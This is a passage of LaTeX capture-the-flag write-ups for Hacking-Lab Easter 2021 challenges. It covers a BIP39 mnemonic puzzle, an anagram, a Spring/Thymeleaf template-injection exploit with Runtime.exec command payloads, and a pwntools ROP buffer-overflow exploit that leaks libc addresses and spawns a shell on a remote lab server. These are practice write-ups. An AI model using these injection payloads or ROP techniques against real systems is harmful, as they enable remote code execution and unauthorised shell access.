+\noindent The title evokes memories of "Finding Nemo", so there could be some
+connection to this movie.  Some research finds that the words given seem to be
+from a technique to create easier to remember "passwords" for block-chain
+wallets.  See e.g.
+\url{https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki} for an
+introduction into the topic and for a description of how the list of words is
+created.  Our list is given in alphabetic order, so we probably have to find out
+the proper ordering.
+
+In short, the words are generating by taking an initial entropy of between 128
+and 256 bits and calculating the
+SHA256 of this entropy. Then the first entropy/32 bits of the SHA256 are
+appended to entropy, giving a new bit-string of 33/32 length of the original
+entropy.  This bit-string is then divided into 11-bit portions, each portion
+corresponds to one word in the wordlist.
+
+So the assumption is that the initial entropy is the flag.  Starting with a test
+entropy of \verb+he2021{123456789012345678901234}+ we can calculate the
+corresponding mnemonic, and it does start with words from the list given in the
+challenge:
+
+\begin{verbatim} 
+half civil metal good bless obtain silver grief cry
+random sock include adapt october smoke mammal curtain 
+right atom gather basket book spin path 
+\end{verbatim}
+
+From here on it is a simple bootstrapping process, start with a crib, check
+which of the leftover words would create a meaningful next step.  We could solve
+this with a typical backtracking algorithm, but it can also done by hand, using
+some knowledge of the film to find the flag.
+
+It corresponds to the mnemonic 
+\begin{verbatim}
+['half','civil','metal','good','bless', 'reason', 'shift', 'home',
+    'garage', 'napkin', 'sunset', 'tongue', 'bind', 'rescue', 'mushroom',
+    'hip', 'hotel', 'lonely', 'blind', 'small', 'adapt', 'craft', 'magnet',
+    'ring']
+\end{verbatim}
+
+\noindent The flag is \verb+he2021{f1sh_r_fr1ends_n0t_f00d!}+
+
+\subsection{Open end}
+We have the flag, but the second column in the specification of the challenge
+was not used at all!  So is this a hidden challenge or just a red herring?
+
+\hypertarget{he21.34}{%
+\section{HE21.34 The Five Seasons}
+  \label{he21.34}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge34.jpg}
+\end{marginfigure}
+
+\noindent Did you know there were five seasons?
+
+\begin{itemize}
+\item Find the flag file!
+
+\item\url{http://46.101.107.117:2111}
+\end{itemize}
+
+\noindent Note: The service is restarted every hour at x:00.
+\subsection{Show Hint}
+The {\NotoEmoji 🐟} is just a trap {\NotoEmoji 😼}
+
+\noindent A hint is hiding in one of the poems.
+
+\hypertarget{he21.34-solution}{%
+\subsection{HE21.34 Solution}\label{he21.34-solution}}
+
+\noindent The hint leads us to check the poems for differences to the
+originals, and -- lo and behold -- we find that the spring poem has a
+change: trees has been changed to ``Thymeleafs''.  We probably have to
+exploit a spring/Thymeleaf vulnerability.  Time to research the
+issues.
+
+Some searching, we find \url{https://www.fatalerrors.org/a/sprboot-thymeleaf-template-injection-for-java-security-development.html} that explains how to inject code into the template engine.  The we need to find a parameter that can be injected, so first check parameter \verb+season+.  When we set it to \verb+xxx+ we get an error message of
+{\footnotesize\begin{verbatim}
+{
+    "timestamp": "2021-04-25T14:59:58.208+0000",
+    "status": 500,
+    "error": "Internal Server Error",
+    "message": "Error resolving template [page-xxx], template might not exist or might not be \
+                            accessible by any of the configured Template Resolvers",
+    "path": "/season"
+}
+\end{verbatim}
+}
+
+\noindent Changing the parameter to execute \verb+whoami+ using \\
+\noindent {\footnotesize\begin{verbatim}
+_$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22)
+                          .getInputStream()).next()%7d__::,x HTTP/1.1
+\end{verbatim}}
+\noindent gives
+
+{\footnotesize\begin{verbatim}
+{
+    "timestamp": "2021-04-25T15:01:02.026+0000",
+    "status": 500,
+    "error": "Internal Server Error",
+    "message": "Error resolving template [page-seasons], template might not exist or might not \
+                        be accessible by any of the configured Template Resolvers",
+    "path": "/season"
+}
+\end{verbatim}
+}
+
+\noindent The output of the command is \verb+seasons+; we are running as user \verb+seasons+.  Now it is a matter of finding the flag, using \verb+ls+.  The error message only displays the first entry, so it is a bit of a pain, but finally we get an error message that themplate \verb+[page-flag.txt]+ is not known.  Use \verb+cat flag.txt+ to show the contents, unfortunately what we get is
+
+{\footnotesize\begin{verbatim}
+
+    "timestamp": "2021-04-25T15:05:08.017+0000",
+    "status": 500,
+    "error": "Internal Server Error",
+    "message": "Error resolving template [page-well], template might not exist or might not \
+                        be accessible by any of the configured Template Resolvers",
+    "path": "/season"
+}
+\end{verbatim}
+}
+
+\noindent So we have the flag, but only the first word...  First thought: use
+\verb+base64 flag.txt+ to encode the file and get it: the error
+message is
+\verb+d2VsbCBkb25lLCBoZXJlIGlzIHlvdXIgZmxhZzogaGUyMDIxe1NwcjFuZ18xc19teV9mNHZydF9z+
+which decodes to
+\verb+well done, here is your flag: he2021{Spr1ng_1s_my_f4vrt_s+.
+  This corresponds with a base64 string with breaks at position 80.
+  We have to find a way to get the second line as well and for this we
+  probably need a pipe.  This can be created using 
+  \verb+new String[] { "bash", "-c", "base64 flag.txt | tail -1" }+ as
+  an argument to exec.  This returns \verb+page-MzRzbiF9+, and we can
+  construct the whole \verb+flag.txt+ as
+
+ \noindent\verb+well done, here is your flag: he2021{Spr1ng_1s_my_f4vrt_s34sn!}+
+  
+
+\hypertarget{he21.35}{%
+\section{HE21.35 The Snake}
+  \label{he21.35}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge35.jpg}
+\end{marginfigure}
+
+Cunning snake has a little riddle for you:
+
+\noindent\verb+21{_inake0dltn_2olospena__iht_fthet!}+
+
+\subsection{Show Hint}
+It's a self-made algorithm, not one you'll find in the web.
+Look at the snake in the title image.
+
+
+\hypertarget{he21.35-solution}{%
+\subsection{HE21.35 Solution}\label{he21.35-solution}}
+
+\noindent This is an anagram to be solved.
+It becomes quite easy, once we take away the known parts of the flag
+(\verb+he2021{}+) and then only lower case characters are present plus
+underscores.  The number of underscores is the number of words sought minus
+one.  \verb+snake+ could be part of the flag, so play around with the words to find
+\verb+he2021{dont_fall_into_the_snake_pit!}+.
+
+
+
+\hypertarget{he21.36}{%
+\section{HE21.36 Doldrums}
+  \label{he21.36}}
+\begin{marginfigure}
+    \includegraphics[width=50mm]{images/challenge36.jpg}
+\end{marginfigure}
+
+\noindent Without wind, no ship can sail.
+\begin{itemize}
+\item This one is really secure. I promise!
+\item \verb+nc 46.101.107.117 2113+
+\item Get a shell and read the flag.
+\end{itemize}
+
+\noindent Note: The service is restarted every hour at x:00.
+
+\noindent File \verb+doldrums+ is provided.
+
+\subsection{Show Hint}
+Ubuntu 18.04 64 Bit
+
+\hypertarget{he21.36-solution}{%
+\subsection{HE21.36 Solution}\label{he21.36-solution}}
+
+\noindent The binary prints a greeting, calls for user input and then prints
+parts of the poem.  Analysing with Ghidra, we see that the user input is done
+again with gets and can overflow the buffer.  Furthermore, we have functions
+\verb+puts+,\verb+system+, and \verb+printf+ available:
+
+\begin{minted}[fontsize=\footnotesize]{c}
+undefined4 main(void)
+{
+  undefined4 pwn_me;
+  undefined local_9;
+  
+  pwn_me = 0;
+  local_9 = 0;
+  init_me_init_buffering();
+  ignore_me_init_signal();
+  puts("Welcome! Here is a nice rime of the poet Samuel Taylor Coleridge for you!");
+  puts("Please press a key to continue!\n");
+  gets((char *)&pwn_me);
+  system("/bin/cat ./heading");
+  puts("-------------------------------------------------------");
+  printf("%s%s%s%s%s%s%s%s%s\n\n%s\n",s_Hear_the_rime_of_the_ancient_mar_0804a060,
+         s_And_the_music_plays_on,_as_the_b_0804a120,s_Driven_south_to_the_land_of_the_s_0804a1a0,
+         s_And_the_ship_sails_on,_back_to_t_0804a260,s_The_mariner_kills_the_bird_of_go_0804a2c0,
+         s_Sailing_on_and_on_and_north_acro_0804a380,s_The_albatross_begins_with_its_ve_0804a3e0,
+         s_And_the_curse_goes_on_and_on_at_s_0804a480,s_"Day_after_day,_day_after_day_We_0804a4e0,
+         s_More_info?_https://en.wikipedia._0804a5c0);
+  return 0;
+}
+\end{minted}
+
+\noindent The plan is to leak addresses of functions, determine the version of the libc
+used and then use the \verb+/bin/sh+ from libc to create a shell using
+\verb+system+.
+
+After learning about pwntools from Adiber, I decided to build the exploit this
+way.  Some learning was needed, but in the end it was much easier than doing it
+by hand.  Determining the offset of the saved RIP as per the description in one
+of the many tutorials:
+
+\begin{verbatim}
+p.sendline(cyclic(100, n=4))
+p.interactive()
+\end{verbatim}
+
+\noindent gives the offset as the pattern \verb+aaae+, so we can use it afterwards to
+build exploit.
+
+Second step: leak the GOT-addresses of some functions to identify the version of libc.
+
+\begin{minted}{python}
+from pwn import *
+# Binary names
+bin_fname = './doldrums'
+
+# Remote
+IP = '46.101.107.117'
+PORT = 2113
+
+# Create ELF objects
+e = ELF(bin_fname)
+x64 = e.bits != 32
+
+cat = 0x0804888d
+main = 0x080485e6 # main is not known (obfuscated)
+
+print(p.recvuntil(b'Please press a key to continue!\n\n'))
+
+# Send payload one to leak address
+rop = ROP(bin_fname)
+rop.raw(cyclic(cyclic_find('aaae', n=4), n=4))
+rop.call(e.plt['puts'], [cat])
+rop.call(e.plt['puts'], [e.got['puts']])
+rop.call(e.plt['puts'], [cat])
+rop.call(e.plt['puts'], [e.got['printf']])
+rop.call(main)
+p.sendline(rop.chain())
+
+# skip the "poem"
+tmp = p.recvuntil(b'Ancient_Mariner\n\n')
+
+# Receive the GOT address of puts
+tmp = p.recvuntil(b'/bin/cat ./heading\n')
+leaked_puts = u32(p.recv(4))
+log.info('the leaked address of puts  : %s' % hex(leaked_puts))
+# Receive the GOT address of printf
+tmp = p.recvuntil(b'/bin/cat ./heading\n')
+leaked_printf = u32(p.recv(4))
+log.info('the leaked address of printf: %s' % hex(leaked_printf))
+\end{minted}
+
+The rop chain first prints a defined string, then the address of \verb+puts+,
+afterwards again the string and the address of \verb+printf+.  With the defined
+string we can identify the addresses in the buffer cleanly.  At the end of the
+exploit we call \verb+main+ again to get a chance to enter the second payload
+that will give us the shell.  This prints out the addresses of the two
+functions and we can use \url{https://libc.blukat.me/} to identify libc:
+
+\begin{figure}
+  \includegraphics[width=150mm]{ch36/identify_libc.png}
+    \caption{Identifying the libc.}
+\end{figure}
+
+Now we have all the information to build the second payload that will actuall
+create the shell.  We can use the offset of \verb+str_bin_sh+ in libc to get
+the shell:
+
+\begin{minted}{python}
+log.info("preparing second payload")
+rop2 = ROP(bin_fname)
+rop2.raw(cyclic(cyclic_find('aaae', n=4), n=4))
+rop2.call(e.plt['system'], [leaked_puts + off_str_bin_sh])
+print(p.recvuntil(b'Please press a key to continue!\n\n'))
+
+p.sendline(rop2.chain())
+log.info("second payload sent")
+
+print(p.recvuntil(b'Ancient_Mariner\n\n'))
+
+p.interactive()
+\end{minted}
+
+\noindent ... and we have a shell ...
+\begin{verbatim}
+[* Switching to interactive mode
+$ ls
+challenge3
+flag
+heading
+ynetd
+$ ls -l
+total 36
+-rwxrwxr-x 1 root root  7048 Mar  3 12:10 challenge3
+-rwxrwxr-x 1 root root    25 Mar  3 12:10 flag
+-rw-rw-r-- 1 root root   607 Mar  3 12:10 heading
+-rwxrwxr-x 1 root root 18744 Mar  3 12:10 ynetd
+$ cat flag
+he2021{1nsp3ktorr_g4dg3t}
+$  
+\end{verbatim}
+
+\subsection{References used for ch36}
+\begin{itemize}
+    \item \url{https://docs.pwntools.com/en/stable/index.html}
+    \item \url{https://sidsbits.com/Defeating-ASLR-with-a-Leak/}
+    \item \url{https://github.com/B34nB01z/writeups/tree/master/2021/CyberApocalypse/system-drop}
+    \item \url{https://www.ret2rop.com/2020/04/got-address-leak-exploit-unknown-libc.html}
+    \item \url{https://libc.blukat.me/}
+\end{itemize}
+
+This finishes level eight and we reach the final level nine:
+
+\begin{figure}
+    \includegraphics[width=150mm]{images/phinisher.png}
+\end{figure}
+
+\end{document}
